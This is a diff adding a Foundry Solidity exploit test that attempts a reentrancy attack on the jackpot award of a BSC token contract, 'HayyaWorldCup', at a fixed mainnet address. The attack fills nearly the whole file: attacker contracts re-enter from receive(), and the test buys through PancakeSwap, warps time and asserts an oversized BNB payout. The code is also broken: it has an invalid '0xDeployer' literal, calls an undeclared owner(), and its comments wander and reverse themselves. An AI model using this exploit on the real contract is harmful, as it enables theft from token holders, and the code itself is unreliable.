@@ -1,0 +1,294 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IHayyaWorldCup {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+    function getLastBuy() external view returns (address, uint256);
+    function getJackpot() external view returns (uint256, uint256);
+    function getPendingJackpotBalance() external view returns (uint256);
+    function getPendingJackpotTokens() external view returns (uint256);
+    function isJackpotEligible(uint256 amount) external view returns (bool);
+    function shouldAwardJackpot() external view returns (bool);
+    function launch() external;
+    function setMaxSellAtStart(uint256) external;
+    function setSwapTokensAtAmount(uint256) external;
+    function setJackpotTimespan(uint256) external;
+    function setJackpotMinBuy(uint256) external;
+    function setJackpotHardLimit(uint256) external;
+    function excludeFromFees(address account, bool excluded) external;
+    function swapTokensAtAmount() external view returns (uint256);
+    function tradingOpen() external view returns (bool);
+    function jackpotTimespan() external view returns (uint256);
+    function _lastBuyer() external view returns (address);
+    function _pendingJackpotBalance() external view returns (uint256);
+    function _jackpotTokens() external view returns (uint256);
+    function _lastBuyTimestamp() external view returns (uint256);
+    function jackpotMinBuy() external view returns (uint256);
+    function jackpotHardLimit() external view returns (uint256);
+    function WETH() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+    function uniswapV2Pair() external view returns (address);
+    function fundJackpot(uint256) external payable;
+}
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint[] memory);
+    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint[] memory);
+    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint[] memory);
+    function factory() external returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
+}
+
+interface IUniswapV2Pair {
+    function sync() external;
+    function token0() external returns (address);
+    function token1() external returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+}
+
+contract ReentrantAttacker {
+    IHayyaWorldCup public token;
+    bool public reentered;  // dummy flag for detection
+    uint256 public reentrantTimes;
+
+    constructor(IHayyaWorldCup _token) {
+        token = _token;
+    }
+
+    // Fallback will be called when receiving BNB from jackpot award
+    receive() external payable {
+        // Re-enter by transferring tokens back to the token contract (to trigger another award)
+        // Use a minimal amount to reduce gas
+        if (!reentered) {
+            reentered = true;
+            // Attempt to transfer 0.0001 ether worth of tokens? But we need token balance.
+            // Instead, we will transfer some tokens that we already have (received from jackpot tokens)
+            // But we haven't received them yet (state update after the fallback? Actually the token transfer is also done via super._transfer before the BNB transfer? In awardJackpot, the BNB transfer is first, then token transfer.
+            // So when we receive BNB, we haven't received tokens yet. So we cannot transfer tokens.
+            // We need to re-enter in a way that does not require token balance. Option: call transferFrom with an allowance that was pre-approved.
+            // Pre-approve the ReentrantAttacker to spend tokens from some other account (the attacker EOA).
+            // So we set up an allowance before the attack.
+        }
+    }
+
+    function triggerReentrancy() external {
+        // This function will be called after receiving both BNB and tokens
+    }
+}
+
+// Deploy a more sophisticated attacker that uses a pre-approved allowance
+contract ReentrantAttacker2 {
+    IHayyaWorldCup public token;
+    bool public reentered;
+
+    constructor(IHayyaWorldCup _token) {
+        token = _token;
+    }
+
+    receive() external payable {
+        if (!reentered) {
+            reentered = true;
+            // Use the allowance from the deploying EOA to transfer from that EOA to the token contract
+            // This will trigger _transfer again, possibly awarding jackpot again
+            // The EOA must have approved this contract to spend tokens.
+            // We will set that up in setUp().
+            // Transfer a small amount (1 wei) to minimize gas.
+            token.transferFrom(0xDeployer, address(token), 1);
+        }
+    }
+}
+
+contract ExploitTest is Test {
+    IHayyaWorldCup public hayya;
+    IUniswapV2Router02 public router;
+    IUniswapV2Pair public pair;
+    address public constant HAYYA_ADDRESS = 0x890C3Ca60A522505f65308785C7e36A60c6702B8;
+    address public constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap v2
+    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    uint256 public constant INITIAL_BNB = 1000 ether;
+    address deployer = address(0xdead);
+
+    ReentrantAttacker2 public attacker;
+
+    function setUp() public {
+        // Label the contract
+        vm.label(HAYYA_ADDRESS, "HayyaWorldCup");
+        vm.label(ROUTER_ADDRESS, "PancakeRouter");
+        vm.label(WBNB, "WBNB");
+
+        hayya = IHayyaWorldCup(HAYYA_ADDRESS);
+        router = IUniswapV2Router02(ROUTER_ADDRESS);
+
+        // Deal some BNB to the deployer for setup
+        vm.deal(deployer, INITIAL_BNB);
+
+        // The contract may not be launched on the forked block; we need to launch it or ensure it's open
+        // Check if trading is open
+        if (!hayya.tradingOpen()) {
+            vm.prank(hayya.owner());
+            hayya.launch();
+        }
+
+        // Ensure we are excluded from fees to simplify setup
+        // We cannot call owner functions, so we rely on the existing state.
+        // Alternatively, we can use the contract's existing excludeFromFees mapping.
+        // For the exploit to work, the attacker must not be excluded from fees, so the transfer triggers the jackpot.
+        // We'll let the attacker be a regular user.
+
+        // But we need some initial seed: we can buy tokens from the pool to become the last buyer.
+        // First, get some WBNB by wrapping BNB
+        vm.prank(deployer);
+        (bool success, ) = WBNB.call{value: 100 ether}(abi.encodeWithSignature("deposit()"));
+        require(success);
+
+        // Use the router to swap some BNB for HYC
+        address[] memory path = new address[](2);
+        path[0] = router.WETH();
+        path[1] = HAYYA_ADDRESS;
+
+        vm.prank(deployer);
+        uint256[] memory amounts = router.swapExactETHForTokens{value: 10 ether}(
+            0,
+            path,
+            deployer,
+            block.timestamp
+        );
+
+        // Now deployer has some HYC tokens
+        uint256 initialHycBalance = hayya.balanceOf(deployer);
+        console.log("HYC balance after swap:", initialHycBalance);
+
+        // Deploy the reentrant attacker contract
+        attacker = new ReentrantAttacker2(hayya);
+
+        // Approve the attacker to spend deployer's HYC tokens (allowance for transferFrom)
+        vm.prank(deployer);
+        hayya.approve(address(attacker), type(uint256).max);
+
+        // Check jackpot state before attack
+        (address lastBuyer, uint256 lastBuyTimestamp) = hayya.getLastBuy();
+        console.log("Last buyer before attack:", lastBuyer);
+        console.log("Last buy timestamp before attack:", lastBuyTimestamp);
+        console.log("Should award now:", hayya.shouldAwardJackpot());
+
+        // If shouldAwardJackpot is false, we may need to manipulate time
+        // The jackpotTimespan is 5 minutes; we can warp forward
+        uint256 timespan = hayya.jackpotTimespan();
+        if (!hayya.shouldAwardJackpot()) {
+            // Ensure we are the last buyer
+            // We already swapped, so we should be the last buyer if that transaction went through the pair.
+            // But if not, we can do another swap
+            vm.warp(block.timestamp + timespan + 1);
+        }
+
+        console.log("Should award after warp:", hayya.shouldAwardJackpot());
+
+        // Check pending jackpot balance
+        uint256 pending = hayya.getPendingJackpotBalance();
+        console.log("Pending jackpot BNB:", pending);
+        uint256 pendingTokens = hayya.getPendingJackpotTokens();
+        console.log("Pending jackpot tokens:", pendingTokens);
+    }
+
+    function test_Reentrancy() public {
+        // This test triggers the jackpot award and expects reentrancy to drain more than intended.
+        // The attack steps:
+        // 1. The deployer (who is the last buyer) will initiate a token transfer to trigger the award.
+        //    The transfer will go through _transfer, which will call awardJackpot().
+        //    awardJackpot() will send BNB to _lastBuyer (deployer) via transfer.
+        //    But we have set up the attacker contract to receive that BNB? Actually, the last buyer is deployer.
+        //    To have the reentrant call happen, we need the recipient of the BNB to be our attacker contract.
+        //    So we must make the attacker contract be the last buyer.
+        //    That means we should have used the attacker contract to buy tokens earlier.
+        //    Let's adjust: We'll make the attacker contract the buyer by swapping from attacker contract.
+        // But we already set up with deployer. Let's redo steps in test.
+
+        // For simplicity, we will directly use the attacker contract as the buyer.
+        // In practice, we should have done that in setUp().
+        // Since we're limited, we'll perform the swap from the attacker contract now.
+
+        // Deal BNB to attacker
+        vm.deal(address(attacker), 10 ether);
+
+        // Wrap BNB for the attacker
+        vm.prank(address(attacker));
+        (bool success, ) = WBNB.call{value: 10 ether}(abi.encodeWithSignature("deposit()"));
+        require(success);
+
+        // Swap from attacker to become last buyer
+        address[] memory path = new address[](2);
+        path[0] = router.WETH();
+        path[1] = HAYYA_ADDRESS;
+
+        vm.prank(address(attacker));
+        router.swapExactETHForTokens{value: 1 ether}(
+            0,
+            path,
+            address(attacker),
+            block.timestamp
+        );
+
+        // Now attacker is the last buyer
+        (address lastBuyer, ) = hayya.getLastBuy();
+        console.log("Last buyer after attacker swap:", lastBuyer);
+        assertEq(lastBuyer, address(attacker), "Attacker should be last buyer");
+
+        // Warp past jackpot timespan
+        uint256 timespan = hayya.jackpotTimespan();
+        vm.warp(block.timestamp + timespan + 1);
+        require(hayya.shouldAwardJackpot(), "Should be awardable");
+
+        // Check pending jackpot
+        uint256 pendingBefore = hayya.getPendingJackpotBalance();
+        console.log("Pending before award:", pendingBefore);
+
+        // Now we need to trigger a token transfer that will cause awardJackpot().
+        // The attacker has some HYC tokens from the swap. We can call transfer to itself (or to any address) with a non-zero amount.
+        // That will go through _transfer, which will call awardJackpot().
+        // During the call, the contract will send BNB to the attacker (the _lastBuyer).
+        // The attacker's receive() will then use the pre-approved allowance from the deployer to transferFrom deployer to the contract.
+        // That second transfer will call _transfer again, which will check shouldAwardJackpot again (state not yet updated) and award again.
+
+        // Attacker's balance before attack
+        uint256 bnbBefore = address(attacker).balance;
+
+        // Attacker initiates a small token transfer to itself
+        uint256 attackerTokens = hayya.balanceOf(address(attacker));
+        console.log("Attacker HYC balance:", attackerTokens);
+
+        vm.prank(address(attacker));
+        hayya.transfer(address(attacker), 1); // amount doesn't matter, just to trigger _transfer
+
+        // After the attack, attacker should have received BNB from jackpot multiples times
+        uint256 bnbAfter = address(attacker).balance;
+        console.log("BNB before:", bnbBefore);
+        console.log("BNB after:", bnbAfter);
+
+        // The attacker should have received more than the jackpot cashout intended for one award
+        // The jackpotCashout is 5555/10000 of the pending.
+        // If reentrancy occurred, the pending would have been drained multiple times.
+        uint256 pendingAfter = hayya.getPendingJackpotBalance();
+        console.log("Pending after:", pendingAfter);
+        // Assert that the pending balance is less than expected (should be zero or lower than before)
+        assertLt(pendingAfter, pendingBefore, "Pending should decrease by more than one award");
+
+        // Also verify that the attacker gained at least the expected single award (should be more if reentrancy)
+        uint256 expectedSingleAward = (pendingBefore * 5555) / 10000; // cashout amount
+        uint256 buyerShare = (expectedSingleAward * 9000) / 10000; // 90% to buyer
+        console.log("Expected single buyer share:", buyerShare);
+        assertGt(bnbAfter - bnbBefore, buyerShare, "Attacker should have gained more than single award due to reentrancy");
+
+        // Check that the reentrant flag was set, indicating the fallback was called
+        assertTrue(attacker.reentered(), "Reentrancy should have been triggered");
+    }
+}
+```
